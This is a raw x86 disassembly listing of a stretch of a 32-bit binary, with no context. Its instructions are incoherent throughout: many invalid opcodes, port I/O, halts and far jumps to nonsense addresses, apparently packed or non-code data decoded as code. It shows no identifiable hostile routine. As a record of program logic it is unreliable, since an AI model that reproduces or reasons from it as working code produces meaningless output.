  40561b:	or     dl,dh
  40561d:	(bad)  
  40561f:	mov    DWORD PTR [edx-0x2703fc6],ecx
  405625:	enter  0xc4fb,0xbd
  405629:	xchg   esp,eax
  40562a:	enter  0xdc5e,0x85
  40562e:	mov    dh,0x72
  405630:	scas   al,BYTE PTR es:[edi]
  405631:	adc    eax,ecx
  405633:	jnp    0x40564b
  405635:	adc    BYTE PTR [esi],dl
  405637:	aaa    
  405638:	ins    DWORD PTR es:[edi],dx
  405639:	stc    
  40563a:	dec    ecx
  40563b:	ds mov al,0x90
  40563e:	inc    ebp
  40563f:	sbb    BYTE PTR [esi-0x6c],dl
  405642:	and    dh,BYTE PTR ss:[ebx+0x65]
  405646:	cmp    ch,0x49
  405649:	fdivr  QWORD PTR [ebx-0x6ca84898]
  40564f:	dec    edx
  405650:	dec    edx
  405651:	and    ebx,DWORD PTR [edx-0x3b]
  405654:	es jge 0x40566b
  405657:	xchg   esp,eax
  405658:	and    eax,0x33459c8d
  40565d:	out    0xc4,al
  40565f:	(bad)
  405663:	jmp    0xf0e2:0x511d784c
  40566a:	pop    eax
  40566b:	or     esi,DWORD PTR [ebx+0x4dcad1c1]
  405671:	mov    ecx,0x73401953
  405676:	cs push 0xffffffe6
  405679:	cmp    cl,0xb5
  40567c:	imul   edx,DWORD PTR [ebx+0xa],0x51
  405680:	adc    eax,0xe342134a
  405685:	jmp    0xabf3:0x20b73186
  40568c:	test   BYTE PTR [esi+ebp*2-0x59],al
  405690:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405691:	push   esi
  405692:	(bad)  
  405693:	imul   edi,DWORD PTR [ebx+0x56],0xeedfea0e
  40569a:	jmp    0x73e2:0xe53e12ff
  4056a1:	or     al,cl
  4056a3:	test   ecx,esp
  4056a5:	or     dl,BYTE PTR [eax-0x2]
  4056a8:	xor    edx,DWORD PTR [ebp-0x5d]
  4056ab:	sbb    ebx,edx
  4056ad:	loope  0x4056f6
  4056af:	out    dx,al
  4056b0:	inc    eax
  4056b1:	inc    edx
  4056b2:	aas    
  4056b3:	loopne 0x40567f
  4056b5:	jbe    0x4056fe
  4056b7:	xchg   ecx,eax
  4056b8:	inc    ebp
  4056b9:	push   es
  4056ba:	mov    ax,ds:0x3e0ac6cd
  4056c0:	and    eax,0x133824db
  4056c5:	lods   eax,DWORD PTR ds:[esi]
  4056c6:	in     eax,dx
  4056c7:	in     eax,0xa6
  4056c9:	and    eax,0x35859ebe
  4056ce:	add    eax,0xc595afbf
  4056d3:	imul   eax,DWORD PTR [esi],0x64
  4056d6:	jmp    0xc32e8677
  4056db:	push   eax
  4056dc:	sbb    eax,0x696ef5e9
  4056e1:	(bad)  
  4056e2:	fmul   DWORD PTR [esp+edi*4+0x57]
  4056e6:	jbe    0x40571b
  4056e8:	faddp  st(2),st
  4056ea:	test   al,0x5e
  4056ec:	out    0x7f,eax
  4056ee:	lahf   
  4056ef:	pop    ebp
  4056f0:	shl    BYTE PTR [edi-0x4ff3f2e3],0xc
  4056f7:	mul    DWORD PTR [eax]
  4056f9:	clc    
  4056fa:	aas    
  4056fb:	shl    esi,0x6c
  4056fe:	or     BYTE PTR [ecx],dh
  405700:	xor    edi,esp
  405702:	nop
  405703:	mov    esi,DWORD PTR [edi]
  405705:	int3   
  405706:	jle    0x4056d9
  405708:	dec    edi
  405709:	rol    eax,1
  40570b:	or     al,0x9e
  40570d:	mov    ecx,edx
  40570f:	push   DWORD PTR [eax-0x7cef65ac]
  405715:	out    dx,eax
  405716:	test   cl,bh
  405718:	xlat   BYTE PTR ds:[ebx]
  405719:	out    dx,al
  40571a:	out    dx,al
  40571b:	add    ecx,DWORD PTR [edi-0x2e]
  40571e:	fistp  QWORD PTR [ebp+0x28edbb7]
  405724:	cwde   
  405725:	ins    BYTE PTR es:[di],dx
  405727:	call   0x73db7193
  40572c:	xor    esp,DWORD PTR ds:0xe709d931
  405732:	ds fs nop
  405735:	ret    
  405736:	gs jne 0x405737
  405739:	stos   BYTE PTR es:[edi],al
  40573a:	adc    edi,eax
  40573c:	mov    dh,0x4e
  40573e:	and    BYTE PTR [esi+0x63ba242a],dl
  405744:	sahf   
  405745:	sub    esi,esp
  405747:	xchg   ebx,eax
  405748:	jecxz  0x40578e
  40574a:	sub    eax,DWORD PTR [ecx]
  40574c:	mov    al,ds:0x8538b85e
  405751:	or     BYTE PTR [eax+edx*2],0x15
  405755:	sub    DWORD PTR [eax],edi
  405757:	push   esp
  405758:	test   DWORD PTR [ebx],0x79f6acac
  40575e:	test   DWORD PTR [ebp+esi*8-0x3],0x50975aad
  405766:	in     eax,dx
  405767:	adc    eax,DWORD PTR [edx]
  405769:	arpl   ax,dx
  40576b:	sub    ebx,DWORD PTR [edi]
  40576d:	mov    ebx,0x9c8c9497
  405772:	push   ebp
  405773:	xor    eax,DWORD PTR [esi+0x6335b6b8]
  405779:	jecxz  0x4057f6
  40577b:	mov    ds:0x4314cad5,eax
  405780:	iret   
  405781:	jl     0x40578b
  405783:	xchg   ebp,eax
  405784:	out    dx,al
  405785:	mov    bl,0xbe
  405787:	sar    esp,1
  405789:	lea    ecx,[esi+edx*1]
  40578c:	shr    bh,1
  40578e:	add    eax,0xc4e9f10c
  405793:	or     al,0xd9
  405795:	(bad)  
  405796:	mov    bl,0xd6
  405798:	jge    0x4057ef
  40579a:	fimul  DWORD PTR [edx-0x36]
  40579d:	pop    ebp
  40579e:	add    edx,DWORD PTR [esi]
  4057a0:	fxch   st(6)
  4057a2:	inc    ebx
  4057a3:	loope  0x405776
  4057a5:	xchg   ebp,eax
  4057a6:	push   cs
  4057a7:	xor    al,0x65
  4057a9:	int    0x8c
  4057ab:	cdq    
  4057ac:	daa    
  4057ad:	mov    edx,0x8a34d12
  4057b2:	sahf   
  4057b3:	shl    BYTE PTR [ebp-0x64],1
  4057b6:	pop    ss
  4057b7:	adc    ebp,ebp
  4057b9:	(bad)  
  4057ba:	fcmove st,st(2)
  4057bc:	add    bh,dh
  4057be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057bf:	gs jl  0x40580f
  4057c2:	ins    DWORD PTR es:[edi],dx
  4057c3:	test   al,0x7d
  4057c5:	xchg   esi,eax
  4057c6:	nop
  4057c7:	mov    al,0xd
  4057c9:	loop   0x4057a0
  4057cb:	js     0x40577a
  4057cd:	cli    
  4057ce:	(bad)  
  4057cf:	lds    esi,FWORD PTR [esi-0x202ac42f]
  4057d5:	adc    eax,0xc533795d
  4057da:	dec    ebp
  4057db:	cld    
  4057dc:	fist   WORD PTR ds:0x46f17b41
  4057e2:	aas    
  4057e3:	(bad)  
  4057e4:	gs push eax
  4057e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057e7:	pop    esi
  4057e8:	repnz xor BYTE PTR [ecx-0x3],dh
  4057ec:	dec    edx
  4057ed:	out    0x34,al
  4057ef:	mov    ah,0xf9
  4057f1:	adc    al,0x8f
  4057f3:	jp     0x4057da
  4057f5:	inc    ecx
  4057f6:	shl    DWORD PTR [edx+0x35897ac],1
  4057fc:	mov    ebp,0xd9924394
  405801:	scas   al,BYTE PTR es:[edi]
  405802:	in     al,0x80
  405804:	or     eax,0x8ef07e0f
  405809:	cmp    ah,al
  40580b:	xchg   ebp,eax
  40580c:	out    dx,eax
  40580d:	sub    esi,ecx
  40580f:	cmc    
  405810:	dec    ebp
  405811:	hlt    
  405812:	mov    eax,DWORD PTR [eax+0x34]
  405815:	mov    ch,0x9e
  405817:	xchg   esp,eax
  405818:	bound  ebx,QWORD PTR ds:[esi]
  40581b:	xor    dh,bh
  40581d:	push   esi
  40581e:	sub    dl,BYTE PTR [eax-0x2ebf3881]
  405824:	xor    DWORD PTR [ebx+0x56525c5f],0xd3cd325e
  40582e:	dec    edx
  40582f:	xchg   ecx,eax
  405830:	xchg   ebx,eax
  405831:	loope  0x405825
  405833:	jb     0x405819
  405835:	lods   al,BYTE PTR ds:[esi]
  405836:	sub    eax,0x627f4463
  40583b:	adc    esi,eax
  40583d:	pop    ss
  40583e:	ret    
  40583f:	sbb    DWORD PTR [esi+0xc],edi
  405842:	mov    DWORD PTR [eax],esp
  405844:	sub    BYTE PTR [ebx-0x73f3641a],0xfb
  40584b:	mov    bh,0xf5
  40584d:	xchg   esi,eax
  40584e:	rcr    DWORD PTR [edx],1
  405850:	push   edi
  405851:	adc    eax,0x5bce0bcc
  405856:	mov    WORD PTR [edi-0x74bc3784],ss
  40585c:	push   esp
  40585d:	mov    dh,0x7a
  40585f:	and    BYTE PTR [ebx-0x7786dce6],0x32
  405866:	dec    esp
  405867:	hlt    
  405868:	xor    ah,bh
  40586a:	push   edi
  40586b:	push   edi
  40586c:	cmp    al,BYTE PTR [edx]
  40586e:	sbb    edx,edi
  405870:	pop    edx
  405871:	ins    BYTE PTR es:[edi],dx
  405872:	jl     0x40583b
  405874:	fsub   st(2),st
  405876:	enter  0x61,0x7b
  40587a:	push   cs
  40587b:	dec    esi
  40587c:	jbe    0x40585e
  40587e:	repnz out 0x64,al
  405881:	xlat   BYTE PTR ds:[ebx]
  405882:	lahf   
  405883:	xchg   edx,eax
  405884:	xchg   ebx,eax
  405885:	mov    ecx,es
  405887:	jmp    0x54ad:0x430712c6
  40588e:	jnp    0x40581a
  405890:	or     al,BYTE PTR [ebx+edx*8+0x16428064]
  405897:	xchg   esi,eax
  405898:	mov    dh,0x97
  40589a:	mov    ah,0x8a
  40589c:	fisttp WORD PTR [edx]
  40589e:	fmul   st(5),st
  4058a0:	pop    ds
  4058a1:	out    0xe4,eax
  4058a3:	push   0x73
  4058a5:	mov    ah,al
  4058a7:	call   0x2d265b24
  4058ac:	imul   edi,eax,0x458908e1
  4058b2:	xor    BYTE PTR ds:0x2f705e9b,al
  4058b8:	popa   
  4058b9:	inc    edi
  4058ba:	add    al,0xd1
  4058bc:	inc    esp
  4058bd:	dec    edi
  4058be:	xor    BYTE PTR [edx],0x3c
  4058c1:	inc    esp
  4058c2:	ds xchg ebx,eax
  4058c4:	sbb    DWORD PTR [ecx-0x207029a5],edi
  4058ca:	xor    al,0x59
  4058cc:	sbb    bh,BYTE PTR [ecx+0x70]
  4058cf:	retf   
  4058d0:	and    edx,esi
  4058d2:	lock mov ebx,DWORD PTR [ecx-0x645bf75]
  4058d9:	xor    al,0xc6
  4058db:	dec    edx
  4058dc:	inc    esp
  4058dd:	repz out dx,al
  4058df:	xor    DWORD PTR es:[eax+edi*2],0x3b500786
  4058e7:	xchg   esi,eax
  4058e8:	mov    ds:0x8010f896,eax
  4058ed:	(bad)  [ebx+ebx*8-0x444e1ded]
  4058f4:	push   ds
  4058f5:	retf   0x8510
  4058f8:	mov    ds:0x8000ebd1,eax
  4058fd:	in     al,0x4f
  4058ff:	or     bh,dh
  405901:	adc    ebp,eax
  405903:	or     BYTE PTR [ecx-0x37a13112],bh
  405909:	idiv   BYTE PTR [esi+0x1c]
  40590c:	nop
  40590d:	cmp    al,0x47
  40590f:	icebp  
  405910:	sbb    edi,DWORD PTR [edx-0x37]
  405913:	dec    edi
  405914:	in     al,dx
  405915:	fisttp DWORD PTR [edi+0x5a2d1114]
  40591b:	ins    DWORD PTR es:[edi],dx
  40591c:	fcom   st(5)
  40591e:	ins    BYTE PTR es:[edi],dx
  40591f:	stos   BYTE PTR es:[edi],al
  405920:	aam    0x82
  405922:	jg     0x4058e8
  405924:	xchg   edx,eax
  405925:	icebp  
  405926:	sub    ebp,edi
  405928:	les    edi,FWORD PTR [edx]
  40592a:	pop    ebp
  40592b:	gs push edi
  40592d:	cs add bh,BYTE PTR gs:[edi-0x10]
  405932:	dec    ebp
  405933:	ja     0x405921
  405935:	sub    DWORD PTR ds:0xdc40488f,0xffffffb4
  40593c:	fs mov bh,0x5e
  40593f:	lea    edi,ds:0xeb5f3d13
  405945:	and    BYTE PTR [ecx],bl
  405947:	xlat   BYTE PTR fs:[ebx]
  405949:	jb     0x4059b2
  40594b:	cmp    bh,BYTE PTR [ebp+edx*8-0x3b]
  40594f:	imul   ebx,DWORD PTR [ebx-0x2a1f7157],0x17
  405956:	xlat   BYTE PTR gs:[ebx]
  405958:	jns    0x4059aa
  40595a:	loope  0x40591a
  40595c:	mov    al,ds:0xa17ab950
  405961:	push   edx
  405962:	loope  0x405970
  405964:	(bad)  
  405965:	icebp  
  405966:	jg     0x40599b
  405968:	mov    al,0x75
  40596a:	add    BYTE PTR [esi],bl
  40596c:	sbb    al,0x53
  40596e:	out    dx,eax
  40596f:	add    ah,bl
  405971:	inc    ebx
  405972:	jg     0x405975
  405974:	(bad)  
  405975:	(bad)  
  405976:	adc    cl,BYTE PTR [ebx-0x1d07ec9]
  40597c:	popa   
  40597d:	cs int3 
  40597f:	jl     0x40599b
  405981:	out    0x51,eax
  405983:	sub    DWORD PTR [edx],0x9bac782f
  405989:	sub    ecx,esi
  40598b:	push   edi
  40598c:	xchg   ecx,eax
  40598d:	push   edx
  40598e:	jle    0x4059ce
  405990:	pop    es
  405991:	mov    ch,0x3
  405993:	jle    0x405946
  405995:	mov    bl,BYTE PTR [ecx+0x10]
  405998:	mov    esi,0x715c00a3
  40599d:	mov    esp,esi
  40599f:	call   0xc52f:0x989581e6
  4059a6:	je     0x4059b8
  4059a8:	cmp    BYTE PTR [ecx+0x3a97ed2],0xce
  4059af:	and    dh,BYTE PTR [ebp+0x0]
  4059b2:	jb     0x405a1c
  4059b4:	scas   al,BYTE PTR es:[edi]
  4059b5:	jmp    0x40598f
  4059b7:	js     0x405972
  4059b9:	fwait
  4059ba:	loope  0x40593e
  4059bc:	sub    al,BYTE PTR fs:[bp+di-0x3f65]
  4059c2:	jg     0x4059b6
  4059c4:	sbb    eax,0xba4620d0
  4059c9:	adc    ebp,eax
  4059cb:	loop   0x405a0b
  4059cd:	jae    0x4059b1
  4059cf:	sti    
  4059d0:	mov    edx,0x664b8e51
  4059d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059d6:	mov    ds:0xb82b7bfe,eax
  4059db:	and    DWORD PTR [eax+ecx*1+0x15],0x42
  4059e0:	mov    eax,0x38002f9
  4059e5:	rol    BYTE PTR [ebp+ebp*8+0x63],cl
  4059e9:	test   ebp,ebx
  4059eb:	jae    0x4059b8
  4059ed:	mul    DWORD PTR [edx]
  4059ef:	loopne 0x4059b9
  4059f1:	test   DWORD PTR [edx+0x2c],0x53759520
  4059f8:	(bad)  
  4059f9:	sub    eax,0xd3d99f85
  4059fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059ff:	es jns 0x4059bd
  405a02:	adc    BYTE PTR [edx],ah
  405a04:	icebp  
  405a05:	mov    WORD PTR [edx+eax*1+0x3d],?
  405a09:	ins    DWORD PTR es:[edi],dx
  405a0a:	mov    ebp,0x441ddd05
  405a0f:	(bad)
  405a12:	mov    dl,0xe8
  405a14:	inc    esi
  405a15:	xchg   BYTE PTR ds:0x2a9abfe1,cl
  405a1b:	mov    ds,esp
  405a1d:	aad    0x98
  405a1f:	cmp    eax,0x5f93045c
  405a24:	mov    ds:0xbd27efb,eax
  405a29:	jmp    0x65c794f3
  405a2e:	mov    al,ds:0xa30061e9
  405a33:	fidivr WORD PTR [edi+ebx*2]
  405a36:	nop
  405a37:	lock fild WORD PTR [edx]
  405a3a:	inc    DWORD PTR [ebp-0xc]
  405a3d:	jp     0x405a8c
  405a3f:	ret    
  405a40:	jae    0x405a9c
  405a42:	es retf 
  405a44:	jp     0x405ac4
  405a46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a47:	in     eax,0x14
  405a49:	sbb    BYTE PTR [ebp+0x68271c2],cl
  405a4f:	push   esp
  405a50:	fisubr DWORD PTR [esi-0x267a6311]
  405a56:	iret   
  405a57:	iret   
  405a58:	push   DWORD PTR [eax]
  405a5a:	dec    esp
  405a5b:	xor    DWORD PTR [eax-0x10],edi
  405a5e:	mov    edx,0x67cdd65d
  405a63:	or     edi,DWORD PTR [ecx-0x79]
  405a66:	add    eax,0xa98d6664
  405a6b:	psrad  mm0,QWORD PTR [ebp+0x23]
  405a6f:	(bad)  
  405a70:	jg     0x405aa2
  405a72:	lea    ecx,[ecx+0x7637b0c6]
  405a78:	mov    esp,0x6e8b7b3
  405a7d:	popf   
  405a7e:	ss scas al,BYTE PTR es:[edi]
  405a80:	push   esp
  405a81:	cmp    esp,DWORD PTR [edx+edx*1]
  405a84:	sar    BYTE PTR [eax-0x1],cl
  405a87:	(bad)  
  405a89:	call   0xac058032
  405a8e:	xchg   BYTE PTR [eax+0xa499886],dl
  405a94:	fld    DWORD PTR [edi]
  405a96:	or     eax,0x2d323050
  405a9b:	mov    al,0x89
  405a9d:	add    cl,BYTE PTR [ebx-0xc]
  405aa0:	sar    edx,0x69
  405aa3:	je     0x405a26
  405aa5:	es jl  0x405ad7
  405aa8:	je     0x405af7
  405aaa:	call   0x47304bf8
  405aaf:	fnsave [edi-0x73ca6199]
  405ab5:	cmp    BYTE PTR [edi+0x3141eb12],ch
  405abb:	fwait
  405abc:	pop    ebx
  405abd:	into   
  405abe:	mov    BYTE PTR [esi-0x59],ah
  405ac1:	idiv   DWORD PTR [esi+0x4a7a50b2]
  405ac7:	fld    QWORD PTR [edx+0x2dcdc6f]
  405acd:	xor    dh,al
  405acf:	mov    ebp,0x97e7fdd5
  405ad4:	popf   
  405ad5:	xor    BYTE PTR [edx+0x308ebc4e],bl
  405adb:	ret    
  405adc:	icebp  
  405add:	dec    ebx
  405ade:	dec    ebp
  405adf:	sbb    DWORD PTR [ecx],ebp
  405ae1:	sub    eax,0xbba112f9
  405ae6:	or     eax,0x5f73efa5
  405aeb:	lods   al,BYTE PTR ds:[esi]
  405aec:	jns    0x405a8a
  405aee:	inc    ebp
  405aef:	mov    esi,0x6c99c048
  405af4:	dec    edx
  405af5:	pop    esi
  405af6:	push   ebp
  405af7:	dec    ebx
  405af8:	in     eax,0x9b
  405afa:	in     eax,dx
  405afb:	loop   0x405b52
  405afd:	and    bh,cl
  405aff:	jae    0x405b3a
  405b01:	ror    BYTE PTR [edi-0x5],1
  405b04:	cs xchg edx,eax
  405b06:	pop    ecx
  405b07:	int    0xbd
  405b09:	adc    al,0x19
  405b0b:	pop    ecx
  405b0c:	mov    ah,0x68
  405b0e:	sti    
  405b0f:	jmp    0x405aa1
  405b11:	les    edx,FWORD PTR [ecx+0x36]
  405b14:	sbb    cl,BYTE PTR [eax-0x77]
  405b17:	cld    
  405b18:	cdq    
  405b19:	cmp    BYTE PTR [ebx],al
  405b1b:	daa    
  405b1c:	(bad)  [ebp+0x3447df4f]
  405b22:	addr16 xor ecx,ebp
  405b25:	fcomp  QWORD PTR [esi-0x4c]
  405b28:	and    al,BYTE PTR [edx+ebx*4+0x3de935e7]
  405b2f:	mov    al,0xb7
  405b31:	iret   
  405b32:	mov    dh,0x35
  405b34:	adc    esi,eax
  405b36:	add    ebp,DWORD PTR [ecx-0x2a]
  405b39:	pop    edx
  405b3a:	pop    edi
  405b3b:	pusha  
  405b3c:	lahf   
  405b3d:	cld    
  405b3e:	dec    eax
  405b3f:	lods   al,BYTE PTR ds:[esi]
  405b40:	and    al,0xdd
  405b42:	lods   eax,DWORD PTR ds:[esi]
  405b43:	in     al,dx
  405b44:	ins    DWORD PTR es:[edi],dx
  405b45:	inc    esp
  405b46:	push   ds
  405b47:	sahf   
  405b48:	cmp    BYTE PTR [edi-0x351e458f],0x72
  405b4f:	call   0x6e3c897e
  405b54:	sub    DWORD PTR [ebx],0x4c28927
  405b5a:	inc    esi
  405b5b:	xchg   edi,eax
  405b5c:	or     ch,BYTE PTR [edi-0x46]
  405b5f:	pop    esi
  405b60:	mov    cl,0x5b
  405b62:	or     ebx,DWORD PTR [eax]
  405b64:	in     al,dx
  405b65:	fadd   QWORD PTR [ebp+0x63]
  405b68:	nop
  405b69:	lock xor ebp,DWORD PTR [eax]
  405b6c:	arpl   WORD PTR [edx],sp
  405b6e:	inc    esi
  405b6f:	mul    BYTE PTR [ecx+0x13]
  405b72:	dec    esp
  405b73:	push   0x19d83edb
  405b78:	shld   DWORD PTR [edx],eax,cl
  405b7b:	ret    
  405b7c:	pushf  
  405b7d:	jp     0x405be8
  405b7f:	lock xchg bl,bh
  405b82:	pop    ebp
  405b83:	dec    ebx
  405b84:	(bad)  
  405b85:	dec    esi
  405b86:	dec    eax
  405b87:	xchg   ecx,eax
  405b88:	pop    eax
  405b89:	dec    eax
  405b8a:	pop    edi
  405b8b:	rol    DWORD PTR [edx],0x17
  405b8e:	sbb    eax,0x9e8b129b
  405b93:	or     ebp,DWORD PTR [eax-0x1ea075bd]
  405b99:	or     ah,BYTE PTR [esi-0x80]
  405b9c:	in     al,0x66
  405b9e:	push   cs
  405b9f:	fcomp  QWORD PTR [esi+ebx*2+0xa5a4a3a]
  405ba6:	lods   al,BYTE PTR ds:[esi]
  405ba7:	cdq    
  405ba8:	cdq    
  405ba9:	jp     0x405b4f
  405bab:	xchg   ebp,eax
  405bac:	push   eax
  405bad:	adc    eax,0x282dde5a
  405bb2:	lahf   
  405bb3:	xchg   ebx,eax
  405bb4:	cmc    
  405bb5:	aas    
  405bb6:	sbb    eax,0x72beb157
  405bbb:	loope  0x405ba7
  405bbd:	je     0x405b4d
  405bbf:	cmp    eax,0x51af9ea7
  405bc4:	rcpps  xmm4,xmm4
  405bc7:	mov    ebx,0xe275b9e8
  405bcc:	adc    al,0x15
  405bce:	retf   0x16d1
  405bd1:	dec    edi
  405bd2:	pop    ss
  405bd3:	cmp    esi,DWORD PTR [edx+0x9e98da7]
  405bd9:	fsub   QWORD PTR [eax-0x34efc2b0]
  405bdf:	hlt    
  405be0:	mov    bl,0xe5
  405be2:	xor    eax,0xa7c9ca49
  405be7:	mov    bl,0x5d
  405be9:	in     eax,0xa8
  405beb:	nop
  405bec:	pop    ebp
  405bed:	add    cl,BYTE PTR [ebx]
  405bef:	out    dx,eax
  405bf0:	sub    BYTE PTR [ecx-0x44a50ae9],al
  405bf6:	adc    eax,esi
  405bf8:	mov    DWORD PTR [ebx-0xe],0x782324c6
  405bff:	inc    eax
  405c00:	push   cs
  405c01:	and    al,0x65
  405c03:	in     al,dx
  405c04:	xchg   edi,esi
  405c06:	sbb    edi,ebx
  405c08:	aam    0x36
  405c0a:	lock aaa 
  405c0c:	mov    eax,ds:0xae4f0ba7
  405c11:	jmp    0x22177502
  405c16:	pop    ds
  405c17:	dec    eax
  405c18:	xor    DWORD PTR [ebx+ebp*4+0x60],ebx
  405c1c:	sub    eax,0xac10f80e
  405c21:	imul   esp,edx,0x65
  405c24:	adc    edx,DWORD PTR [esi]
  405c26:	rcl    BYTE PTR [edi],0xe2
  405c29:	mov    edi,ebx
  405c2b:	mov    ecx,0xecd42d71
  405c30:	das    
  405c31:	iret   
  405c32:	iret   
  405c33:	sub    esp,DWORD PTR [eax]
  405c35:	adc    BYTE PTR [edx-0x47],ch
  405c38:	imul   esi,DWORD PTR [edx],0x2f795bc5
  405c3e:	int    0xcf
  405c40:	pop    ecx
  405c41:	inc    esi
  405c42:	jmp    0x18d5:0xe8e1a515
  405c49:	cld    
  405c4a:	adc    bh,0xc8
  405c4d:	lahf   
  405c4e:	adc    ah,BYTE PTR [edi-0x49]
  405c51:	inc    edx
  405c52:	mov    ah,0x2e
  405c54:	dec    eax
  405c55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c56:	stc    
  405c57:	data16 jp 0x405cac
  405c5a:	in     eax,dx
  405c5b:	mov    ah,0xfe
  405c5d:	push   ss
  405c5e:	dec    ecx
  405c5f:	sub    ecx,ecx
  405c61:	lock test DWORD PTR [eax-0x2e],esi
  405c65:	xor    BYTE PTR [esi+ecx*2+0x2119930],ch
  405c6c:	ins    BYTE PTR es:[edi],dx
  405c6d:	pop    eax
  405c6e:	xor    BYTE PTR [edx+0x68d428cb],0xdb
  405c75:	repnz (bad)
  405c78:	ret    0xfeb8
  405c7b:	and    eax,0xff16c635
  405c80:	ins    BYTE PTR es:[edi],dx
  405c81:	sub    BYTE PTR [edi-0x36cc4e71],dh
  405c87:	(bad)  
  405c89:	mov    eax,0x8565429c
  405c8e:	inc    eax
  405c8f:	ins    BYTE PTR es:[edi],dx
  405c90:	into   
  405c91:	clc    
  405c92:	xchg   ebp,eax
  405c93:	popa   
  405c94:	push   ds
  405c95:	into   
  405c96:	cmp    eax,0xd0e5745
  405c9b:	scas   eax,DWORD PTR es:[edi]
  405c9c:	push   0xffffffb7
  405c9e:	ins    DWORD PTR es:[edi],dx
  405c9f:	mov    BYTE PTR [eax],al
  405ca1:	jbe    0x405c8d
  405ca3:	jl     0x405cad
  405ca5:	mov    ebx,DWORD PTR [esi+eiz*2]
  405ca8:	int    0xa0
  405caa:	cmp    dh,bh
  405cac:	popa   
  405cad:	mov    esp,0x8bca043e
  405cb2:	pop    edi
  405cb3:	mov    edx,0xe3f1ca06
  405cb8:	or     dh,BYTE PTR [esi]
  405cba:	cmp    al,0x3b
  405cbc:	push   cs
  405cbd:	rcr    ah,0xe1
  405cc0:	repz ret 
  405cc2:	add    al,0x3c
  405cc4:	mov    fs,WORD PTR [eax]
  405cc6:	adc    ebx,DWORD PTR [esi]
  405cc8:	dec    edx
  405cc9:	fadd   QWORD PTR ds:0xbf07a7aa
  405ccf:	jge    0x405d1a
  405cd1:	add    ebp,DWORD PTR [ebp+ebp*4-0x45614ea0]
  405cd8:	push   edi
  405cd9:	shr    DWORD PTR [esi+ebx*8+0x62],cl
  405cdd:	cdq    
  405cde:	addr16 or al,0xda
  405ce1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ce2:	mov    al,ds:0xaa2c0203
  405ce7:	shl    DWORD PTR [esi-0x70],0x23
  405ceb:	adc    al,BYTE PTR [edx-0x19839c81]
  405cf1:	fimul  DWORD PTR [edi+ecx*8]
  405cf4:	sbb    eax,ebx
  405cf6:	inc    DWORD PTR [edi-0x2b]
  405cf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cfa:	stos   DWORD PTR es:[edi],eax
  405cfb:	adc    BYTE PTR [edi-0x70],dh
  405cfe:	sub    dl,BYTE PTR ds:0xa868580e
  405d04:	lods   al,BYTE PTR ds:[esi]
  405d05:	popf   
  405d06:	int3   
  405d07:	aad    0xd7
  405d09:	outs   dx,DWORD PTR ds:[esi]
  405d0a:	xchg   ebx,eax
  405d0b:	push   ss
  405d0c:	inc    ebx
  405d0d:	push   cs
  405d0e:	sub    edi,DWORD PTR [ebx-0x280a8351]
  405d14:	mov    eax,0x7f0c3f0b
  405d19:	dec    eax
  405d1a:	sbb    BYTE PTR [ebx-0x431b4899],0xc7
  405d21:	nop
  405d22:	mov    ebx,0xeeca76dd
  405d27:	imul   ecx,DWORD PTR [ebp-0x560cc2dd],0x3b
  405d2e:	cdq    
  405d2f:	mov    bl,0x3f
  405d31:	scas   al,BYTE PTR es:[edi]
  405d32:	sub    edx,ecx
  405d34:	mov    eax,0xdca59909
  405d39:	mov    ebp,0xd0fa113d
  405d3e:	lods   al,BYTE PTR ds:[esi]
  405d3f:	dec    eax
  405d40:	sub    edx,esi
  405d42:	add    edx,DWORD PTR [ebx]
  405d44:	jnp    0x405d40
  405d46:	pop    eax
  405d47:	jl     0x405dbe
  405d49:	adc    esp,0xfffffffc
  405d4c:	inc    ebx
  405d4d:	mov    esp,0xce65823e
  405d52:	pop    ebx
  405d53:	mov    ecx,0xe1230b8d
  405d58:	jb     0x405ce3
  405d5a:	sbb    ebp,edi
  405d5c:	call   0xf0992173
  405d61:	xchg   ebp,eax
  405d62:	fisttp QWORD PTR [ebp+0x50bac4f9]
  405d68:	lahf   
  405d69:	xchg   ebx,eax
  405d6a:	shr    DWORD PTR [esi-0x24e9f576],0x96
  405d71:	mov    ch,0x25
  405d73:	arpl   WORD PTR [esp+ebp*2+0x36],dx
  405d77:	jg     0x405d2a
  405d79:	ins    DWORD PTR es:[edi],dx
  405d7a:	jg     0x405dd3
  405d7c:	or     esi,esi
  405d7e:	or     eax,0xccd6bc84
  405d83:	push   ds
  405d84:	or     BYTE PTR [edi+0x19e96e84],cl
  405d8a:	test   BYTE PTR fs:[ecx-0x1b267444],bh
  405d91:	jnp    0x405d34
  405d93:	mov    esi,0x19967235
  405d98:	push   0x98dbfb6f
  405d9d:	add    eax,0x9de73497
  405da2:	mov    bl,0x77
  405da4:	and    DWORD PTR ds:0x450c3f39,ecx
  405daa:	loope  0x405e0c
  405dac:	jns    0x405d52
  405dae:	icebp  
  405daf:	xor    dh,dl
  405db1:	add    BYTE PTR [ecx+0x4009af20],al
  405db7:	mov    ?,WORD PTR [edx-0x3458be9b]
  405dbd:	xor    al,0x63
  405dbf:	mov    DWORD PTR ds:0x10d0e3cf,ecx
  405dc5:	scas   al,BYTE PTR es:[edi]
  405dc6:	fs push eax
  405dc8:	das    
  405dc9:	inc    eax
  405dca:	aam    0x54
  405dcc:	jns    0x405e40
  405dce:	aaa    
  405dcf:	ret    
  405dd0:	addr16 sub ebx,edx
  405dd3:	inc    esi
  405dd4:	sub    al,0x65
  405dd6:	mov    edx,0x824e7aac
  405ddb:	xchg   ebp,eax
  405ddc:	pop    edx
  405ddd:	imul   ebp,esi,0x7f6fc293
  405de3:	dec    edi
  405de4:	jno    0x9cdbac83
  405dea:	push   edi
  405deb:	inc    esp
  405dec:	jp     0x405dce
  405dee:	data16 cmp dh,cl
  405df1:	inc    eax
  405df2:	in     eax,dx
  405df3:	mov    eax,0x2e9de49c
  405df8:	hlt    
  405df9:	jo     0x405e3f
  405dfb:	fistp  DWORD PTR [ecx]
  405dfd:	add    al,0x30
  405dff:	clc    
  405e00:	jb     0x405dd8
  405e02:	sub    BYTE PTR [ebp+0x1d649f06],bl
